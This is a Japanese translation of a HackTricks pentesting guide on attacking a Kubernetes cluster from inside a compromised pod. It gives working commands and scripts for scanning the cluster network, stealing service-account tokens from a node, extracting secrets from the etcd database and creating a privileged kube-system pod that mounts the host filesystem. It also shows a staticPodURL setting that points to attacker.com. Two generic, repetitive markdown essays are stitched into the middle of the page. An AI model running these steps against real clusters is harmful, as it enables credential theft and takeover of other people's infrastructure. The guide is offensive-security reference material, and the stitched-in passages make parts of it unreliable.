# Pod 内部から Kubernetes を攻撃する

<details>

<summary><strong>AWS ハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告掲載したい場合**や **HackTricks を PDF でダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegram グループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* **HackTricks** の GitHub リポジトリ [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) に PR を提出して、あなたのハッキングテクニックを共有してください。

</details>

## **Pod 脱出**

**運が良ければ、Pod からノードに脱出することができるかもしれません：**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Pod からの脱出

Pod から脱出しようとする場合、まず**権限昇格**が必要になることがあります。そのためのいくつかのテクニック：

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Pod を乗っ取った後、脱出を試みるためには、以下の **docker 脱出** テクニックをチェックしてください：

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Kubernetes 権限の悪用

**kubernetes 列挙**についてのセクションで説明されているように：

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

通常、Pod はそれらの内部に**サービスアカウントトークン**を持って実行されます。このサービスアカウントには、クラスタ内の他の Pod に**移動**したり、設定されたノードに**脱出**したりするために**悪用**できる**権限**がいくつか付与されている可能性があります。方法は以下をチェックしてください：

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### クラウド権限の悪用

Pod が**クラウド環境**内で実行されている場合、メタデータエンドポイントから**トークンを漏洩**させ、それを使用して権限を昇格させることができるかもしれません。

## 脆弱なネットワークサービスの検索

Kubernetes 環境内にいるので、現在の Pod の権限を悪用して権限昇格できない場合やコンテナから脱出できない場合は、**潜在的に脆弱なサービスを探すべきです。**

### サービス

**この目的のために、Kubernetes 環境のすべてのサービスを取得しようとすることができます：**
```
kubectl get svc --all-namespaces
```
デフォルトでは、Kubernetesはフラットなネットワーキングスキーマを使用しており、クラスタ内の**任意のpod/serviceが他と通信できます**。クラスタ内の**namespacesはデフォルトではネットワークセキュリティ制限がありません**。namespace内の誰でも他のnamespacesと通信できます。

### スキャニング

以下のBashスクリプトは（[Kubernetesワークショップ](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s_cheatsheet.md)から取得したもので）、KubernetesクラスタのIP範囲をインストールしてスキャンします：
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
以下のページをチェックして、**Kubernetes特有のサービスを攻撃**し、**他のポッド/環境全体を侵害**する方法を学びましょう：

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### スニッフィング

**侵害されたポッドが機密性の高いサービスを実行している**場合、他のポッドが認証する必要があるため、**ローカル通信をスニッフィング**することで、他のポッドから送信される認証情報を取得することができるかもしれません。

## ネットワークスプーフィング

デフォルトでは、**ARPスプーフィング**（それによって**DNSスプーフィング**）などの技術がKubernetesネットワークで機能します。したがって、ポッド内で**NET\_RAW機能**（デフォルトで存在する）を持っていれば、カスタムパケットを送信し、**同じノードで実行されているすべてのポッドに対してARPスプーフィングによるMitM攻撃を実行**できます。\
さらに、**悪意のあるポッド**が**DNSサーバーと同じノードで実行されている**場合、**クラスタ内のすべてのポッドに対してDNSスプーフィング攻撃を実行**できます。

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## ノードDoS

Kubernetesマニフェストにリソースの明記がなく、コンテナに**適用されるリミット**範囲が設定されていません。攻撃者として、ポッド/デプロイメントが実行されている**すべてのリソースを消費**し、他のリソースを枯渇させ、環境にDoSを引き起こすことができます。

これは、[**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)などのツールを使用して行うことができます：
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
実行中の`stress-ng`とその後の違いがわかります。
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## ノードのポストエクスプロイト

コンテナから**脱出**に成功した場合、ノード内でいくつか興味深いものが見つかります：

* **コンテナランタイム**プロセス（Docker）
* このノードで実行されている他の**ポッド/コンテナ**を悪用できます（より多くのトークン）
* 全体の**ファイルシステム**と**OS**一般
* リスニングしている**Kube-Proxy**サービス
* リスニングしている**Kubelet**サービス。設定ファイルを確認してください：
* ディレクトリ：`/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* その他の**kubernetesの共通ファイル**：
* `$HOME/.kube/config` - **ユーザー設定**
* `/etc/kubernetes/kubelet.conf`- **通常の設定**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **ブートストラップ設定**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcd設定**
* `/etc/kubernetes/pki` - **Kubernetesキー**

### ノードkubeconfigの検索

以前にコメントしたパスの中でkubeconfigファイルが見つからない場合は、kubeletプロセスの引数`--kubeconfig`を**確認してください**：
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### シークレットを盗む
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
スクリプト [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) は自動的に**他のポッドのトークンを取得し、探している権限を持っているかどうかをチェックします**（1つずつ確認する代わりに）。
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### 特権DaemonSets

DaemonSetは**全てのクラスタノードで実行される** **pod**です。したがって、DaemonSetが**特権サービスアカウント**で設定されている場合、**全てのノード**でその**特権サービスアカウント**の**トークン**を見つけることができ、悪用することができます。

エクスプロイトは前のセクションと同じですが、今回は運に依存しません。

### クラウドへのピボット

クラスタがクラウドサービスによって管理されている場合、通常、**ノードはPodとは異なるメタデータ**エンドポイントへのアクセスを持っています。したがって、ノードから（またはhostNetworkをTrueに設定したpodから）**メタデータエンドポイントにアクセス**しようとしてください：

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### etcdの盗み

コンテナが実行されるNodeの[**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)を指定できる場合、コントロールプレーンノード内でシェルを取得し、**etcdデータベース**を取得します：
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-planeノードは**role master**を持ち、**クラウド管理クラスタではそれらで何も実行できません**。

#### etcdからシークレットを読む

`nodeName`セレクタをポッド仕様に使用して、ポッドをcontrol-planeノードで実行できる場合、`etcd`データベースに簡単にアクセスできるかもしれません。このデータベースには、クラスタのすべての設定、すべてのシークレットを含んでいます。

以下は、あなたがいるcontrol-planeノード上で`etcd`が実行されている場合に、`etcd`からシークレットを素早く取得する方法です。`etcd`クライアントユーティリティ`etcdctl`を持つポッドを立ち上げ、control-planeノードの認証情報を使用してどこで実行されているかに関わらずetcdに接続する、より洗練された解決策を求める場合は、@mauilionの[この例のマニフェスト](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)をチェックしてください。

**`etcd`がcontrol-planeノードで実行されているか確認し、データベースがどこにあるかを見る（これは`kubeadm`で作成されたクラスタ上です）**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
# Kubernetes内のPodからの攻撃

Kubernetesは、コンテナ化されたアプリケーションのデプロイ、スケーリング、および管理を自動化するためのオープンソースプラットフォームです。セキュリティはKubernetesの重要な側面であり、攻撃者がクラスタ内で権限を昇格させたり、機密情報を漏洩させたりすることを防ぐために、適切なセキュリティ対策が必要です。

## Pod内からのKubernetes APIサーバーへのアクセス

Pod内からKubernetes APIサーバーにアクセスすることは、攻撃者がクラスタ内のリソースを探索し、潜在的な攻撃ベクトルを特定するための一般的な手法です。Podは、APIサーバーと通信するためにサービスアカウントを使用します。このサービスアカウントの権限が不適切に設定されている場合、攻撃者はクラスタ内で権限を昇格させることができます。

### サービスアカウントトークンの取得

Podは、`/var/run/secrets/kubernetes.io/serviceaccount/token`にあるサービスアカウントトークンを使用してAPIサーバーと通信します。攻撃者がこのトークンにアクセスできれば、サービスアカウントの権限内で行動することができます。

### APIサーバーへのリクエスト

サービスアカウントトークンを使用して、攻撃者は`kubectl`コマンドや直接HTTPリクエストを介してAPIサーバーにリクエストを送信できます。これにより、攻撃者はクラスタ内のリソース情報を取得したり、構成を変更したりすることができます。

## サービスアカウントの権限の昇格

攻撃者がサービスアカウントの権限を昇格させることができれば、クラスタ内でより多くの操作を実行することが可能になります。これには、RoleやRoleBindingの作成や変更が含まれます。

### RoleとRoleBindingの理解

Roleは、Kubernetesリソースに対する特定の権限を定義します。RoleBindingは、特定のユーザーやグループにRoleを割り当てることで、その権限を付与します。

### 権限の昇格のためのRoleとRoleBindingの作成

攻撃者は、既存のRoleやRoleBindingを変更するか、新しいRoleやRoleBindingを作成することで、サービスアカウントの権限を昇格させることができます。これにより、攻撃者はクラスタ内でより多くの権限を持つことができます。

## 結論

Kubernetesクラスタのセキュリティは、攻撃者が権限を昇格させたり、機密情報を漏洩させたりするリスクを最小限に抑えるために重要です。Pod内からの攻撃は、クラスタのセキュリティ体制を評価するためのpentestingの一環として行われることがあります。適切なセキュリティ対策と監視を実施することで、これらのリスクを軽減することができます。
```
```bash
data-dir=/var/lib/etcd
```
**etcdデータベースのデータを表示する：**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**データベースからトークンを抽出し、サービスアカウント名を表示する**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**同じコマンドですが、kube-systemネームスペースのデフォルトトークンのみを返すためのいくつかのgrepがあります**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
# Kubernetes内のPodからの攻撃

Kubernetesクラスター内で実行されているPodから攻撃を開始することは、攻撃者がクラスター内のリソースにアクセスし、潜在的な脆弱性を探索するための一般的な手法です。この文書では、Pod内からKubernetesクラスターを攻撃するためのいくつかの方法について説明します。

## 権限昇格

Pod内で実行されているプロセスは、通常、限定された権限を持っています。しかし、設定の誤りや脆弱性を利用することで、より高い権限を取得することが可能です。

### サービスアカウントトークンの悪用

Kubernetesは、サービスアカウントを介してPodにAPIサーバーとの認証情報を提供します。デフォルトでは、このトークンはPodのファイルシステムにマウントされ、攻撃者はこれを利用してクラスター内の他のリソースにアクセスすることができます。

#### トークンの発見

```bash
ls /var/run/secrets/kubernetes.io/serviceaccount/
```

このコマンドを実行すると、サービスアカウントトークンが保存されているディレクトリを見つけることができます。

#### トークンの使用

取得したトークンを使用して、Kubernetes APIに対して認証されたリクエストを行うことができます。

```bash
curl https://kubernetes.default.svc.cluster.local/api --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

このコマンドは、サービスアカウントトークンを使用してKubernetes APIにリクエストを送信します。

## 情報収集

攻撃者は、クラスター内の情報を収集することで、攻撃を計画しやすくなります。

### APIサーバーの探索

Kubernetes APIサーバーは、クラスターの管理と操作に使用される中心的なコンポーネントです。攻撃者はAPIサーバーを探索して、クラスターの構成や実行中のサービスに関する情報を収集することができます。

#### APIリソースのリストアップ

```bash
kubectl get all --all-namespaces
```

このコマンドを使用すると、クラスター内のすべてのリソースのリストを取得できます。

### etcdの探索

etcdは、Kubernetesの設定情報と状態情報を保持するキーバリューストアです。攻撃者はetcdにアクセスし、機密情報を抽出することができます。

#### etcdへのアクセス

etcdへのアクセスは通常、APIサーバーを介して行われますが、直接アクセスすることも可能です。

```bash
ETCDCTL_API=3 etcdctl --endpoints=https://[etcd-server-endpoint]:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get / --prefix --keys-only
```

このコマンドは、etcdサーバーに対して認証されたアクセスを試み、キーのリストを取得します。

## ネットワークスニッフィング

Podからネットワークトラフィックを監視することで、攻撃者は他のPodやサービス間の通信を傍受し、機密情報を収集することができます。

### tcpdumpの使用

tcpdumpは、ネットワークトラフィックをキャプチャし分析するためのツールです。

```bash
tcpdump -i any
```

このコマンドは、すべてのインターフェースでネットワークトラフィックをキャプチャします。

## 結論

PodからKubernetesクラスターを攻撃することは、攻撃者にとって有効な手段です。権限昇格、情報収集、ネットワークスニッフィングなどの技術を使用して、クラスター内の脆弱性を発見し、悪用することができます。
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### スタティック/ミラーポッドの永続性

_スタティックポッド_ は、APIサーバーが監視せずに、特定のノード上のkubeletデーモンによって直接管理されます。コントロールプレーン（例えば、デプロイメント）によって管理されるポッドとは異なり、**kubeletは各スタティックポッドを監視**（そして、失敗した場合には再起動します）。

したがって、スタティックポッドは常に特定のノード上の一つのKubeletに**束縛されます**。

**kubeletは自動的にKubernetes APIサーバー上にミラーポッドを作成しようとします**。これは、ノード上で実行されているポッドがAPIサーバー上で見えることを意味しますが、そこから制御することはできません。ポッド名はノードホスト名を接頭辞としてハイフンが付きます。

{% hint style="danger" %}
スタティックポッドの**`spec`は他のAPIオブジェクトを参照することはできません**（例：ServiceAccount、ConfigMap、Secretなど）。したがって、**現在のノードで任意のserviceAccountを持つポッドを起動してクラスターを侵害する行為はできません**。しかし、異なるネームスペースでポッドを実行するためにこれを利用することは可能です（何らかの理由で役立つ場合）。
{% endhint %}

ノードホスト内にいる場合、**自身内にスタティックポッドを作成**させることができます。これは非常に便利です。なぜなら、**kube-system**のような**異なるネームスペースにポッドを作成する**ことができるかもしれないからです。

スタティックポッドを作成するためには、[**ドキュメントが大変役立ちます**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)。基本的に必要なのは2つのことです：

* **kubeletサービス**または**kubelet設定**（[**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)）でパラメータ**`--pod-manifest-path=/etc/kubernetes/manifests`**を設定し、サービスを再起動する
* **`/etc/kubernetes/manifests`**に**ポッド定義**を作成する

**もう一つのより隠密な方法は以下の通りです：**

* **kubelet**設定ファイルのパラメータ**`staticPodURL`**を変更し、`staticPodURL: http://attacker.com:8765/pod.yaml`のように設定します。これにより、kubeletプロセスは指定されたURLからの**設定を取得してスタティックポッドを作成**します。

**例**：**kube-system**で特権ポッドを作成する**ポッド**の設定は[**こちら**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)から取得しました：
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### ポッドの削除 + スケジュール不可ノード

攻撃者が**ノードを侵害**し、他のノードから**ポッドを削除**し、他のノードがポッドを実行**できないようにする**と、ポッドは侵害されたノードで再実行され、そこで実行されている**トークンを盗む**ことができます。\
[**詳細はこちらのリンクをフォローしてください**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes)。

## 自動ツール

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>
